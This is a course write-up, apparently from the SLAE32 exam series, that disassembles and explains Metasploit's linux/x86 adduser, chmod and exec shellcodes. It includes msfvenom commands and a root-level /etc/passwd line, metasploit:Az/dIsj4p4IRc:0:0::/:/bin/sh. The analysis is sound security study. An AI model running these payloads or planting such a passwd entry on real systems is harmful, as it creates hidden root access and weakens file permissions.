---
layout: post
title:  "SLAE32"
subtitle: "|  Assignment 5 - Msfpayload"
date:   2022-10-05 08:45:58 +0200
category: SLAE32
subject: Assignment 5 - Msfpayload
excerpt_separator: <!--more-->
github-link: TODO
---

###  <span style="color:#2d8fb3;"> Description of the assignment </span>

- Take up at least 3 shellcode samples created using Msfpayload for linux/x86
- Use GDB/NDisasm/Libemu to dissect the functionality of the shellcode
- Present your analysis

We are going to analyse together the following shellcodes:
- linux/x86/adduser
- linux/x86/exec
- linux/x86/meterpreter/reverse_tcp -TO SUPP
- linux/x86/chmod
 
<!--more-->

###  <span style="color:#2d8fb3;"> Part 1 - linux/x86/adduser shellcode </span>

####  <span style="color:#01416C;"> Principle </span>

This first shellcode creates a user named 'metasploit' with the password 'metasploit'. 

    metasploit:metasploit

To analyse the shellcode we use ndisasm to display the instructions as follows :

    msfvenom -p linux/x86/adduser R | ndisasm -u -


**Code result :** 

    00000000  31C9              xor ecx,ecx
    00000002  89CB              mov ebx,ecx
    00000004  6A46              push byte +0x46
    00000006  58                pop eax
    00000007  CD80              int 0x80 // setreuid
    00000009  6A05              push byte +0x5
    0000000B  58                pop eax
    0000000C  31C9              xor ecx,ecx
    0000000E  51                push ecx
    0000000F  6873737764        push dword 0x64777373
    00000014  682F2F7061        push dword 0x61702f2f
    00000019  682F657463        push dword 0x6374652f
    0000001E  89E3              mov ebx,esp
    00000020  41                inc ecx
    00000021  B504              mov ch,0x4
    00000023  CD80              int 0x80 // Open
    00000025  93                xchg eax,ebx
    00000026  E828000000        call 0x53
    0000002B  6D                insd
    0000002C  657461            gs jz 0x90
    0000002F  7370              jnc 0xa1
    00000031  6C                insb
    00000032  6F                outsd
    00000033  69743A417A2F6449  imul esi,[edx+edi+0x41],dword 0x49642f7a
    0000003B  736A              jnc 0xa7
    0000003D  3470              xor al,0x70
    0000003F  3449              xor al,0x49
    00000041  52                push edx
    00000042  633A              arpl [edx],di
    00000044  303A              xor [edx],bh
    00000046  303A              xor [edx],bh
    00000048  3A2F              cmp ch,[edi]
    0000004A  3A2F              cmp ch,[edi]
    0000004C  62696E            bound ebp,[ecx+0x6e]
    0000004F  2F                das
    00000050  7368              jnc 0xba
    00000052  0A598B            or bl,[ecx-0x75]
    00000055  51                push ecx
    00000056  FC                cld
    00000057  6A04              push byte +0x4
    00000059  58                pop eax
    0000005A  CD80              int 0x80 //
    0000005C  6A01              push byte +0x1
    0000005E  58                pop eax
    0000005F  CD80              int 0x80 //


####  <span style="color:#01416C;"> Execution of the shellcode </span>


The first thing we will try is to exploit the executable to see the result:

<img src="/assets/slae32-img/assignment5/assignment5.1.PNG" alt="drawing" style="width:900px;"/>

***Note: Be careful with unknown shellcodes.***

And when we search into the /etc/passwd file, we can see that the user has been well added as we can see:

    metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh

Then we will look into more details about this shellcode.

####  <span style="color:#01416C;"> 1 - setreuid </span> 

The first instructions passed are as follows:

        00000000  31C9              xor ecx,ecx
        00000002  89CB              mov ebx,ecx
        00000004  6A46              push byte +0x46
        00000006  58                pop eax
        00000007  CD80              int 0x80

<img src="/assets/slae32-img/assignment5/assignment5.8.PNG" alt="drawing" style="width:900px;"/>

And the registers passed to that syscall are:
- EAX = 0x46 which is 70 in decimal
- EBX = 0
- ECX = 0
- EDX = 0
- ESI = 0
- EDI = 0

So when we look at the syscall number 70 into "/usr/include/x86_64-linux-gnu/asm/unistd_32.h" and we get the setreuid syscall:

    root@kali:~/Documents/adduser# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 70
    #define __NR_setreuid 70

**Details of the syscall:**

    setreuid - set real and/or effective user ID
    int setreguid(uid_t ruid, uid_t euid);

The analysis shows a setruid call with a real and effective user ID set to 0. By doing that, a privilege elevation is performed. Indeed, it changes the user ID of the user who launch the shellcode to 0 which corresponds to the root user ID. 

####  <span style="color:#01416C;">  2 - Open </span> 

    00000009  6A05              push byte +0x5
    0000000B  58                pop eax
    0000000C  31C9              xor ecx,ecx
    0000000E  51                push ecx
    0000000F  6873737764        push dword 0x64777373 // dwss
    00000014  682F2F7061        push dword 0x61702f2f // ap//
    00000019  682F657463        push dword 0x6374652f // cte/
    0000001E  89E3              mov ebx,esp
    00000020  41                inc ecx
    00000021  B504              mov ch,0x4
    00000023  CD80              int 0x80

<img src="/assets/slae32-img/assignment5/assignment5.9.PNG" alt="drawing" style="width:900px"/>


The registers passed to that syscall are:
- EAX = 0x5 (Open syscall)
- EBX = /etc//passwd
- ECX = 0x401
- EDX = 0
- ESI = 0
- EDI = 0

So when look at the syscall number 5 we get the setreuid call :

    #define __NR_open 5

Syscall details: 

    open - open and possibly create a file
    int open(const char *pathname, int flags)

**EBX - Explanation**

If we look at the push performed and then move into the EBX register, we can see that the values as follows are pushed:

push dword 0x64777373 // dwss
push dword 0x61702f2f // ap//
push dword 0x6374652f // cte/

Because of the little endian, the values are inversed but if we put them in the other way, it becomes "/etc//passwd". 
And with the push ECX performed before, the value of EBX becomes /etc//passwd0x00.

**ECX - Explanation:**

***Technic 1***

The easiest way to find the flags parameters passed to the ECX registers is to use the tool strace. 

    root@kali:~/Documents/adduser# strace ./adduser 2>&1 | grep open
    open("/etc//passwd", O_WRONLY|O_APPEND) = 3

It displays the paramters O_WRONLY and O_APPEND have been passed to the open function.

***Technic 2***

The second technic is by looking at the value 0x401 passed to ECX.
If we try to convert the value in decimal, it gives 2001 as we can see:

    root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/assignment5/chmod# printf "%o\n" 0x401
    2001

To find the corresponding flags, we have to look into the /usr/include/asm-generic/fcntl.h file and as we can see it confirms that the flag values are: 

    #define O_WRONLY	00000001 
    #define O_APPEND	00002000

For the first one, the detail in the man 2 open page shows:

    The argument flags must include one of the following access modes: O_RDONLY, O_WRONLY, or O_RDWR. 
    These request opening the file read-only, write-only, or read/write, respectively.

And for the second one, the details in the man 2 open page shows:

    O_APPEND
        The  file  is  opened in append mode.  Before each write(2), the file offset is posi‐
        tioned at the end of the file, as if with lseek(2).  The  modification  of  the  file
        offset and the write operation are performed as a single atomic step.

So, by specifying the O_WRONLY and the O_APPEND flags, the file permissions set are respectively the write only and the writing of the data at the end of the file.

####  <span style="color:#01416C;">  3 - JMP-CALL-POP </span> 

In the instruction section, we can see the following instructions: 
        
    00000025  93                xchg eax,ebx
    00000026  E828000000        call 0x53

So to better understand the behavior, we look at it into GDB which gave the following instructions:

    0x8048079:	xchg   ebx,eax
    0x804807a:	call   0x80480a7
    0x80480a7:	pop    ecx

The first instruction store the file descriptor into EAX. Then, as we could see into GDB, the JMP-CALL-POP technic is used to retrive the address of the string that needs to be inserted into the /etc/passwd file. The last instruction store the address of the following value :

    ECX: 0x804807f ("metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh\nY\213Q\374j\004X̀j\001X̀")

####  <span style="color:#01416C;"> 4 - Write </span> 

Then in GDB, we display the newt instructions :

    0x80480a8:	mov    edx,DWORD PTR [ecx-0x4] // Length
    0x80480ab:	push   0x4
    0x80480ad:	pop    eax
    0x80480ae:	int    0x80

<img src="/assets/slae32-img/assignment5/assignment5.7.PNG" alt="drawing" style="width:900px"/>

As we can see the register values are:
- EAX = 0x4 // Write Syscall
- EBX = 0x3 // File descriptor
- ECX = 0x804807f // Address of the values to write
- EDX = 0x28 // 40 in decimal
- ESI = 0
- EDI = 0

So when we look at the syscall number 4 into "/usr/include/x86_64-linux-gnu/asm/unistd_32.h" and we get the write syscall:

    root@kali:~/Documents/adduser# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 4
    #define __NR_write 4

man 2 write result:
    
    ssize_t write(int fd, const void *buf, size_t count);

So, this syscall write in the /etc/passwd file the string 'metasploit:Az/dIsj4p4IRc:0:0:: /:/bin/sh\n'' with a length of 40. 

####  <span style="color:#01416C;"> 5 - Exit </span> 

GDB displayed the final instructions as follows:

    0x80480b0:	push   0x1
    0x80480b2:	pop    eax
    0x80480b3:	int    0x80

<img src="/assets/slae32-img/assignment5/assignment5.10.PNG" alt="drawing" style="width:900px"/>

As we can see the register values are:
- EAX = 0x1 // Exit Syscall
- EBX = 0x3 // File descriptor

So, we look into the unistd_32.h file to find the corresponding syscall and it seems that is is an Exit syscall.

    root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/assignment5/adduser# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 1
    #define __NR_exit 1_

Result : 
The final instruction perform an Exit syscall and it let a random value for the status parameter.

###  <span style="color:#2d8fb3;"> Part 2 - linux/x86/chmod shellcode </span>

####  <span style="color:#01416C;"> Principle </span>

This linux/x86/chmod shellcode runs a chmod command on a specified file with specified mode. 

To analyze the shellcode purpose, the file "restrictedfile" is created with the specifications as follows:

    root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/assignment5/chmod# ls -l /etc/restrictedfile 
    -rw-r--r-- 1 root root 0 févr. 16 20:44 /etc/restrictedfile

The rights attributed to the file are initially 0644 and in this exercise, we are going to analyse a shellcode which change them to 0777.

To make sure that the shellcode works, we created it shellcode and executed it:

<img src="/assets/slae32-img/assignment5/assignment5.11.PNG" alt="drawing" style="width:900px"/>

As we can see, the rights on the file have been changed successfully.

####  <span style="color:#01416C;"> Analysis </span>

To analyse the shellcode we can use several technics.
First, we can use directly GDB to go step by step and stop (break) at each syscall and look at the register's values. 

Then, we can used the libemu/tools/sctest script to analyse it:

    msfvenom -p linux/x86/chmod R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000
            -S : read shellcode from stdin
            -s : how much of the shellcode we would like to run (100000 => to have all the shellcode executed)

And, we used the graphical option to help to visualize it:

    msfvenom -p linux/x86/chmod FILE=/etc/restrictedfile MODE=0777 R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000 -G chmod.dot
    //Then convert into PNG file :
    dot chmod.dot -Tpng -o chmod.png

Finally, we can display the instruction with the following command line:

    msfvenom -p linux/x86/chmod FILE=/etc/restrictedfile MODE=0777 R | ndisasm -u -

In this assessment, we will use all of those technic to be more accurate on the actions performed.

Shellcode instructions: 

    0x8048054:	cdq    
    0x8048055:	push   0xf
    0x8048057:	pop    eax
    0x8048058:	push   edx
    0x8048059:	call   0x8048072
    0x804805e:	das    
    0x804805f:	gs je  0x80480c5
    0x8048062:	das    
    0x8048063:	jb     0x80480ca
    0x8048065:	jae    0x80480db
    0x8048067:	jb     0x80480d2
    0x8048069:	arpl   WORD PTR [ebp+eiz*2+0x64],si
    0x804806d:	imul   bp,WORD PTR [ebp+eiz*2+0x0],0x685b
    0x8048074:	inc    DWORD PTR [ecx]
    0x8048076:	add    BYTE PTR [eax],al
    0x8048078:	pop    ecx
    0x8048079:	int    0x80
    0x804807b:	push   0x1
    0x804807d:	pop    eax
    0x804807e:	int    0x80

####  <span style="color:#01416C;"> 1 - CHMOD </span> 

The first instruction are as follows :

    0x8048054:	cdq    
    0x8048055:	push   0xf // decimal value = 15
    0x8048057:	pop    eax

As we can see, the hexadecimal value 0xf (15 in decimal) is poped into the EAX register. We searched for the syscall associated to the decimal value 15 and we found that it corresponds to the chmod syscall.

    root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/assignment5/chmod# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 15
    #define __NR_chmod 15

Syscall details: 
    
    chmod - change permissions of a file
    int chmod(const char *pathname, mode_t mode);    

We can see that the chmod function is constituted as follows: 
- *pathname: Pointer pointing to the string of the targeted file pathname;
- mode: Mode to apply to the file.

The technic of the jump call pop is used to retrive the address of the string "/etc/restricted" as we can see:

Call instruction:

<img src="/assets/slae32-img/assignment5/assignment5.13.PNG" alt="drawing" style="width:900px"/>

Pop Instruction:

<img src="/assets/slae32-img/assignment5/assignment5.14.PNG" alt="drawing" style="width:900px"/>

Address of the string "/etc/restricted" strored into the register EBX:

<img src="/assets/slae32-img/assignment5/assignment5.15.PNG" alt="drawing" style="width:900px"/>

Then the next step is to set up the second parameter "mode". 
The next instructions showed by GDB are as follows:

<img src="/assets/slae32-img/assignment5/assignment5.16.PNG" alt="drawing" style="width:900px"/>

As we can see, it pop into the ECX register the value "0x1ff" which correspond to the decimal value 777 that we specified in an option of our shellcode.

    root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/assignment5/chmod# printf "%o\n" 0x1ff
    777

Then, at the syscall instruction (0x80), it gives the following state:

<img src="/assets/slae32-img/assignment5/assignment5.17.PNG" alt="drawing" style="width:900px"/>

With the registers:
- EAX = 0xf // decimal value 15 for the chmod syscall
- EBX = 0x804805e ("/etc/restrictedfile") // address of the string of the file
- ECX = 0x1ff // decimal value 777 for the mode


###### Exit

Finally the last instructions are as follows:

<img src="/assets/slae32-img/assignment5/assignment5.18.PNG" alt="drawing" style="width:900px"/>

We can see that the value 0x1 is passed to the EAX register. 
By looking at the corresponding sycall in the unistd_32.h file, we find out that it corresponds to the exit syscall.

    root@kali:~/Documents/PentesterAcademy/SLAE32-Exam/assignment5/chmod# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 1
    #define __NR_exit 1

Details of the Exit syscall:

    _exit, terminate the calling process
    #include <unistd.h>
    void _exit(int status);

Finally, we can see in the last instruction that only the EAX register has been changed because the status parameter required is only used to return a state to the parent process which is not required in our case.



###  <span style="color:#2d8fb3;"> Part 3 - linux/x86/exec shellcode </span>

####  <span style="color:#01416C;"> Principle </span>

This linux/x86/exec shellcode execute an arbirary command line. 

To find out how the shellcode works and reacts we first performed a test with the following the steps:

<img src="/assets/slae32-img/assignment5/assignment5.21.PNG" alt="drawing" style="width:900px"/>

As we can see, an ls command as been specified to the shellcode and successfully executed when launch.

Now we are will go deeper and find out which syscalls are performed.

####  <span style="color:#01416C;"> Shellcode Analysis </span>

To analyse this shellcode we can use several technics.
First, we can use directly GDB to go step by step an stop at each syscall and looking at the register's values. 

We can used as well the libemu/tools/sctest script to analyse it :

    msfvenom -p linux/x86/exec CMD=ls R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000
        -S : read shellcode from stdin
        -s : how much of the shellcode we would like to run (100000 => to have all the shellcode executed)

And used the graphical option to help to visualize it :

    msfvenom -p linux/x86/exec CMD=ls R | /opt/hackingtools/libemu/tools/sctest/sctest -vvv -Ss 100000 -G exec.dot
    //Then convert into PNG file :
    dot exec.dot -Tpng -o exec.png

Result:

<img src="/assets/slae32-img/assignment5/assignment5.22.PNG" alt="drawing" style="width:900px"/>

Finally, we can display the instruction with the following command line:

    msfvenom -p linux/x86/exec CMD=ls R | ndisasm -u -

In this assessment, we will use all of those technic to be more specific about the actions performed.

Shellcode instructions: 

    0x8048054:	push   0xb
    0x8048056:	pop    eax
    0x8048057:	cdq    
    0x8048058:	push   edx
    0x8048059:	pushw  0x632d
    0x804805d:	mov    edi,esp
    0x804805f:	push   0x68732f
    0x8048064:	push   0x6e69622f
    0x8048069:	mov    ebx,esp
    0x804806b:	push   edx
    0x804806c:	call   0x8048074
    0x8048071:	ins    BYTE PTR es:[edi],dx
    0x8048072:	jae    0x8048074
    0x8048074:	push   edi
    0x8048075:	push   ebx
    0x8048076:	mov    ecx,esp
    0x8048078:	int    0x80

The first two instructions set the value of eax to 0xb.

    0x8048054:	push   0xb
    0x8048056:	pop    eax

0xb in hexadecimal is equivalent to 11 in decimal.

    root@kali:~/exec# printf "%d\n" 0xb
    11

We search what syscall corresponds to the decimal value 11 in the unistd_32.h file and it appears that it is the execve syscall.

    root@kali:~/exec# cat /usr/include/x86_64-linux-gnu/asm/unistd_32.h | grep 11
    #define __NR_execve 11

Details of the execve syscall:

    execve - execute program
    int execve(const char *pathname, char *const argv[], char *const envp[]);

So, the arguments of the exceve syscall as follows needs to be defined:
- Pathname: Pointer pointing to the string of the path to the executable;
- Argv[]: Array of pointers pointing to the command-line strings;
- envp[]: Array of pointers pointing to the environment strings of the new program (usually NULL).

The next instructions are:

    0x8048058:	push   edx
    0x8048059:	pushw  0x632d
    0x804805d:	mov    edi,esp

It set the value 0x632d to the registers EDI. 

We mapped the value 0x632d to the ASCII table and inversed the value because of the little indian indentation and we find out that the EDI register is set to "-c".

Then, two pushs are performed on the stack and the address is then set to the register EBX.

    0x804805f:	push   0x68732f => /sh
    0x8048064:	push   0x6e69622f => /bin
    0x8048069:	mov    ebx,esp

Then, we mapped the values to the ASCII table and inversed the values because of the little indian indentation and we deducted that the address of the string "/bin/sh" has been set into the EBX register.

Then, the following instruction are used to retrieve the command line that we want to launch.

    0x804806b:	push   edx
    0x804806c:	call   0x8048074
    0x8048071:	ins    BYTE PTR es:[edi],dx
    0x8048072:	jae    0x8048074
    0x8048074:	push   edi
    0x8048075:	push   ebx
    0x8048076:	mov    ecx,esp

The call instruction performed put on the stack the address of the ls string, then the edi's value "-c" is pushed on the stack as well as the /bin/sh and finally the ESP address containing the argument "/bin/sh -c ls" is pushed into the ECX register.

To conclude, as follows the state of the Execve syscall:

<img src="/assets/slae32-img/assignment5/assignment5.24.PNG" alt="drawing" style="width:900px"/>

SO, we can see that:
- The EAX register contains the decimal value 11 related to the Execve syscall;
- The EBX register contains the address of the string pathname /bin/sh;
- The ECX register contains the arguments "/bin/sh -c ls";
- The EDX value is set to NULL.

And, when the syscall is performed, the "ls" command line is executed:

<img src="/assets/slae32-img/assignment5/assignment5.25.PNG" alt="drawing" style="width:900px"/>

